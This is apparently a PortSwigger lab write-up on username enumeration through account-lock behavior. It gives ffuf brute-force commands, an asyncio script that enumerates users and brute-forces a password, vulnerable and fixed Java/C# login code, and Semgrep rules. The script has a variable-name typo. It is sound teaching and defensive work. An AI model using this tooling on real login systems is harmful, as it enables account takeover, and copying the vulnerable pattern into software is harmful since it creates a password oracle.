---
title: "Lab 05: Username enumeration via account lock"
date: 2025-12-19
categories: [portswigger, authentication] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-19-lab05_authentication/
---

## 1. Executive Summary

**Vulnerability:** Information Disclosure via Account Lock Logic.

**Description:** The application implements account locking to prevent brute-forcing. However, the system verifies the password *before* checking if the account is locked. Additionally, the account locking mechanism reveals which usernames are valid because only valid users get "locked out" after multiple failures; invalid users just keep getting "Invalid username".

**Impact:**

 1.  **Username Enumeration:** Attackers can identify valid usernames by spamming login attempts and seeing which ones eventually trigger an error other than “Invalid username or password.”.

2.  **Password Brute-Force:** Once a target is identified and locked, the attacker can continue guessing passwords. Due to the `order-of-operations flaw`, a correct password triggers a slightly different response (or error message) than an incorrect one, even while the account is locked.

## 2. The Attack

**Objective:** Identify the valid username by triggering a lock, then find the correct password by analyzing response discrepancies.

1. **Enumeration (Triggering the Lock):**
    - To find the valid username, I needed to simulate a brute-force attack on every candidate username. Valid users will eventually get locked out; invalid users will not.
    - I used `ffuf` in `clusterbomb` mode. I needed to send multiple requests per username, so I used a small list of 5 dummy passwords against the username list.
    - **Command:**Bash
        
        ```bash
        ffuf -mode clusterbomb \
          -X POST \
          -w dummy_passwords.txt:FUZZ \
          -w usernames.txt:FUZ2Z \
          -u "https://LAB-ID.web-security-academy.net/login" \
          -d 'username=FUZ2Z&password=FUZZ' \
          -fr "Invalid username or password." \
          -t 20
        ```
        
    - **Result:** The username `anaheim` eventually started returning a response that contained "You have made too many incorrect login attempts" (or similar), while others continued returning "Invalid username".
        
        ![image.png](image.png)
        
2. **Brute-Force (The Logic Flaw):**
    - Now that `anaheim` is locked, standard logic dictates I should wait. However, because of the flaw, I can keep attacking.
    - I ran a brute-force attack against `anaheim` using the password list.
    - **The Logic:** If the password is *wrong*, the server replies "Invalid username or password" (or a generic lock message). If the password is *correct*, the server calculates the hash, sees it matches, *then* checks the lock, and returns a specific "Account Locked" error (or a response with a different size).
        
        ![image.png](image%201.png)
        
    - **Command:**Bash
        
        ```bash
        ffuf -X POST -w passwords.txt:FUZZ \
          -u https://LAB-ID.web-security-academy.net/login \
          -d 'username=anaheim&password=FUZZ' \
          -t 10 -fs 3184,3132
        ```
        
    - **Result:** Most requests returned the standard error size. One specific password returned a different response size. This was the valid password.
        
        ![image.png](image%202.png)
        

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The code performs the expensive and sensitive operation (Password Validation) *before* the cheap and blocking operation (Lock Check).

- **The Flaw:** `validatePassword()` runs first. If successful, the code proceeds to check `isLocked()`.
- **The Leak:** This creates two distinct error states while locked:
    1. **Wrong Password:** Fails at step 1. Returns "Invalid Credentials".
    2. **Right Password:** Passes step 1, Fails at step 2. Returns "Account Locked".
    - *Even if the message is the same, the timing or response size often differs.*

### Java (Spring Boot)

```java
@PostMapping("/login")
public String login(@RequestParam String username, @RequestParam String password, Model model) {
    User user = userRepository.findByUsername(username);

    if (user == null) return "error";

    // VULNERABLE: Checking Password FIRST
    if (passwordEncoder.matches(password, user.getPassword())) {
        
        // Check Lock AFTER verifying credentials
        if (user.isAccountNonLocked()) {
            return "redirect:/dashboard";
        } else {
            // Leak: We only reach here if the password was CORRECT.
            model.addAttribute("error", "Your account is locked.");
            return "login";
        }
    }

    // Wrong Password logic
    user.incrementFailedAttempts();
    model.addAttribute("error", "Invalid username or password");
    return "login";
}
```

**Technical Flow & Syntax Explanation:**

- **`passwordEncoder.matches(...)`**: This verifies the credentials.
- **The Branch**: If the password is wrong, the code jumps to the bottom block. If the password is right, it enters the `if` block.
- **The Reveal**: The attacker sends a password. If they get "Invalid username", they know it's wrong. If they get "Your account is locked", they know the password was **right**, even though they can't log in yet.

### C# (ASP.NET Core)

```csharp
[HttpPost("login")]
public async Task<IActionResult> Login(LoginModel model)
{
    var user = await _userManager.FindByNameAsync(model.Username);
    if (user == null) return BadRequest("Invalid login");

    // VULNERABLE: Check password match directly
    if (await _userManager.CheckPasswordAsync(user, model.Password))
    {
        // Password is good. Now checking lock status.
        if (await _userManager.IsLockedOutAsync(user))
        {
            // Leak: Reaching this line confirms the password is correct.
            return BadRequest("User account is locked");
        }
        return Ok("Welcome");
    }

    // Wrong password
    await _userManager.AccessFailedAsync(user);
    return BadRequest("Invalid login");
}
```

**Technical Flow & Syntax Explanation:**

- **`CheckPasswordAsync`**: Checks the hash.
- **`IsLockedOutAsync`**: Checks the database flag for a lock.
- **Logic Gap**: By placing the lock check *inside* the success block of the password check, the developer inadvertently created an oracle.

### Mock PR Comment

The `login` method currently verifies the password hash before checking if the user is locked out. This allows an attacker to identify the correct password for a locked account by observing the change in error message (from "Invalid login" to "Account locked").

**Recommendation:** Always check `isLockedOut()` *before* attempting `CheckPasswordAsync()`. If the user is locked, reject the request immediately without processing the password.

## 4. The Fix

**Explanation of the Fix:**
The fix is simple: **Check the Lock First.** If the user is locked, stop processing immediately. Do not verify the password. This ensures that valid and invalid passwords yield the exact same response (the "Locked" message) once the account is blocked.

### Secure Java

```java
@PostMapping("/login")
public String login(@RequestParam String username, @RequestParam String password) {
    User user = userRepository.findByUsername(username);

    // SECURE: Check Lock FIRST
    if (user != null && !user.isAccountNonLocked()) {
        // Return generic error or lock message regardless of password
        return "error_page"; 
    }

    // Only verify password if account is active
    if (user != null && passwordEncoder.matches(password, user.getPassword())) {
        return "redirect:/dashboard";
    }

    return "error_page";
}
```

**Technical Flow & Syntax Explanation:**

- **Early Exit**: The `!user.isAccountNonLocked()` check happens at the very top.
- **Uniformity**: Whether the attacker sends "password123" (wrong) or "secret" (right), the code hits the first `if` block and returns. The password verification logic is never reached.

### Secure C#

```csharp
public async Task<IActionResult> Login(LoginModel model)
{
    var user = await _userManager.FindByNameAsync(model.Username);

    // SECURE: Check Lockout status before password check
    if (user != null && await _userManager.IsLockedOutAsync(user))
    {
        // Immediate rejection
        return BadRequest("Invalid login attempt.");
    }

    // Now safe to check password
    if (user != null && await _userManager.CheckPasswordAsync(user, model.Password))
    {
        return Ok();
    }
    
    return BadRequest("Invalid login attempt.");
}
```

## 5. Automation

*A high-speed `asyncio` script that performs both phases: identifying the username by triggering the lock, and then exploiting the response difference to find the password.*

```python
#!/usr/bin/env python3
import argparse
import asyncio
import aiohttp
import sys

# phase 1: we send this many bad passwords to trigger the lock
LOCT_ATTEMPTS = 5
BAD_PASS = "dummypass"

async def login_request(session, url, username, password):
    data = {'username': username, 'password': password}
    try:
        async with session.post(url, data=data) as resp:
            text = await resp.text()
            return text, len(text)
    except Exception as e:
        return None, 0

async def exploit(url, userlist, passlist):
    login_url = f"{url.rstrip('/')}/login"
    with open(userlist, 'r') as f:
        usernames = [line.strip() for line in f]

    target_user = None
    print(f"[*] Phase 1: Enumerating Username (Spamming {LOCK_ATTEMPTS} attempts)...")

    async with aiohttp.ClientSession() as session:
        for user in usernames:
            tasks = [login_request(session, login_url, user, BAD_PASS) for _ in range(LOCK_ATTEMPTS)]
            responses = await asyncio.gather(*tasks)

            # Check the LAST response to see if it changed to "Locked"
            last_body, last_len = responses[-1]

            if "Invalid username" not in last_body:
                print(f"[+] FOUND TARGET: {user}")
                print(f"[*] Response changed. Assuming {user} is now locked.")
                target_user = user
                break

        if not target_user:
            print("[-] Failed to lock out any user. Check attempt count.")
            sys.exit(1)

        # 2. Brute Force against Locked Account
        print(f"[*] Phase 2: Brute Forcing Password for {target_user}...")

        with open(passlist, 'r') as f:
            passwords = [line.strip() for line in f ]

        # We need a baseline "Wrong Password" response size for the locked account
        _, baseline_len = await(login_request(session, login_url, target_user, "wrongpassword"))
        print(f"[*] Baseline 'Locked & Wrong' Length: {baseline_len}")

        BATCH_SIZE = 10
        for i in range(0, len(passwords), BATCH_SIZE):
            batch = passwords[i : i + BATCH_SIZE]
            tasks = [login_request(session, login_url, target_user, p) for p in batch]
            results = await asyncio.gather(*tasks)

            for (body, length), pwd in zip(results, batch):
                # We look for ANY deviation from the baseline length
                if length != baseline_len:
                    print(f"\n[!!!] PASSWORD FOUND: {pwd}")
                    print(f"[+] Response Length: {length} (Baseline: {baseline_len})")
                    return
            
            print(f"\r[*] Checked {i+len(batch)}/{len(passwords)}...", end="")

    print("\n[-] Password not found.")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("users", help="Username list")
    ap.add_argument("passwords", help="Password list")
    args = ap.parse_args()

    asyncio.run(exploit(args.url, args.users, args.passwords))

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules detect the dangerous pattern of verifying a password before checking the account status.*

### Java Rule

```yaml
rules:
  - id: java-check-password-before-lock
    languages: [java]
    message: |
      Password verification occurs before account lock check. 
      This logic flaw allows attackers to verify passwords on locked accounts. 
      Check 'isLocked()' or 'isEnabled()' before 'matches()'.
    severity: WARNING
    patterns:
      - pattern: |
          if ($ENCODER.matches($PASS, ...)) {
              ...
              if ($USER.isLocked()) { ... }
          }
```

**Technical Flow & Syntax Explanation:**

- **Sequence Detection**: The rule looks for the `matches` call (password check) acting as the *outer* condition, with the `isLocked` check nested *inside* it. This confirms the flawed order of operations.

### C# Rule

```yaml
rules:
  - id: csharp-check-password-before-lock
    languages: [csharp]
    message: "Security Flaw: Password checked before Lockout status."
    severity: WARNING
    patterns:
      - pattern: |
          if (await $MANAGER.CheckPasswordAsync($USER, ...)) {
              ...
              if (await $MANAGER.IsLockedOutAsync($USER)) { ... }
          }
```

**Technical Flow & Syntax Explanation:**

- **`CheckPasswordAsync`**: Identifies the ASP.NET Identity password validation.
- **`IsLockedOutAsync`**: Identifies the lock status check.
- **Nesting**: Flags code where the lock check is unreachable unless the password is already correct.
